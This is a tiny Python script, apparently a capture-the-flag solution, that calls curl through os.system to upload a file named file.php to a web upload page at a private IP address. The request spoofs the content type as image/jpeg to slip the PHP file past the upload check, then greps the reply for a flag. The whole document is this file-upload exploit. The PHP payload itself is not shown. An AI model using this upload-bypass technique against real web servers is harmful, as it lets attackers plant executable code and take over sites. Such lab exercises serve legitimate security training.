import os

os.system("curl -X POST -F 'Upload=Upload' -F 'uploaded=@file.php;type=image/jpeg' \"http://192.168.1.100/?page=upload\" | grep \"flag\"")